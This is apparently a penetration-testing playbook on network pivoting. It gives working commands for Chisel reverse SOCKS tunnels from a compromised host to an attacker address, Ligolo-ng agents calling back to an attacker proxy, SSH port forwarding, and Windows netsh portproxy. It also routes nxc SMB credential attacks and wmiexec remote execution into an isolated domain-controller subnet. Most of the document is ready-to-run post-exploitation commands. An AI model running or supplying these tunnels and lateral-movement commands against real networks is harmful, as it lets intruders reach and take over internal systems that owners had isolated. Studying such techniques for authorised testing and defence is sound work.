# 🌐 Network Pivoting & Tunneling Playbook

In realistic enterprise environments, critical database clusters, Active Directory Domain Controllers, and internal management interfaces are placed inside isolated subnets unreachable directly from an initial external foothold. Pivoting bridges this gap by routing offensive traffic through compromised dual-homed bastion hosts.

---

### Pivoting Architecture

```text
[Attacker Machine]               [Compromised Web Server]          [Internal Domain Controller]
(10.10.14.5 - Public)            (Dual-Homed Pivot Host)           (Isolated Subnet: 192.168.56.10)
        │                                   │                                    │
        │ <====== SOCKS5 / SSH Tunnel =====>│                                    │
        │         (Port 8000 / 22)          │ -------- SMB / LDAP / RPC -------> │
        │                                   │          (192.168.56.0/24)         │
```

---

### Tool 1: Chisel SOCKS5 Reverse Proxy

Chisel is an HTTP-based tunneling tool that encapsulates TCP traffic through an encrypted SSH channel wrapped in HTTP/1.1 or WebSockets, blending cleanly into web traffic.

#### 1. Setup on Attacker (Server Mode)

```bash
# Start Chisel reverse listener on attacker machine
./chisel server -p 8000 --reverse
```

#### 2. Execution on Compromised Host (Client Mode)

```bash
# Connect back to attacker and open SOCKS5 proxy on attacker's port 1080
./chisel client 10.10.14.5:8000 R:1080:socks
```

#### 3. Route Tools Through Tunnel using Proxychains

Add the SOCKS5 proxy to `/etc/proxychains4.conf`:
```text
[ProxyList]
socks5 127.0.0.1 1080
```

Now execute standard tools directly against the internal isolated subnet:
```bash
proxychains4 nxc smb 192.168.56.0/24 -u 'jdoe' -p 'Welcome2025!'
proxychains4 wmiexec.py CORP.LOCAL/svc_sql@192.168.56.21
```

---

### Tool 2: Ligolo-ng (Layer 3 TUN Pivoting)

Unlike SOCKS proxies which only handle TCP connections and require `proxychains`, **Ligolo-ng** creates a virtual TUN interface on the attacker host, enabling full IP-level routing (including ICMP ping, SYN scans, and raw UDP).

#### 1. Setup on Attacker (Proxy Server)

```bash
# 1. Create a virtual TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Start Ligolo proxy
./proxy -selfcert -laddr 0.0.0.0:11601
```

#### 2. Execution on Compromised Pivot Host (Agent)

```bash
# Connect agent back to proxy
./agent -connect 10.10.14.5:11601 -ignore-cert
```

#### 3. Establish Session & Route

In the Ligolo proxy console:
```text
ligolo-ng » session
[?] Select a session: 1 - Administrator@CORP-WS01
[Administrator@CORP-WS01] » start
```

Add the target subnet to your local Linux kernel routing table:
```bash
sudo ip route add 192.168.56.0/24 dev ligolo
```

Now you can interact directly with the internal network without `proxychains`:
```bash
ping 192.168.56.10
nmap -sS -p 445,88,389 192.168.56.10
```

---

### Tool 3: SSH Port Forwarding (Living-off-the-Land)

#### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Open local SOCKS4/5 proxy on port 1080 via SSH host
ssh -D 1080 -N -f user@pivot.corp.local
```

#### Local Port Forwarding (Reaching Internal Services)
```bash
# Access internal DC LDAP (389) via localhost:3890
ssh -L 3890:192.168.56.10:389 user@pivot.corp.local -N -f
```

#### Remote Port Forwarding (Exposing Attacker Listener)
```bash
# Expose attacker's web server (port 8000) inside internal network on pivot's port 8080
ssh -R 8080:127.0.0.1:8000 user@pivot.corp.local -N -f
```

---

### Tool 4: Windows-Native `netsh interface portproxy`

When external tools cannot be dropped to disk, Windows provides native port forwarding:

```cmd
:: Forward incoming connections on port 4455 of pivot to internal DC SMB (port 445)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4455 connectaddress=192.168.56.10 connectport=445

:: Verify active port proxies
netsh interface portproxy show all

:: Clean up rule when operation completes
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4455
```
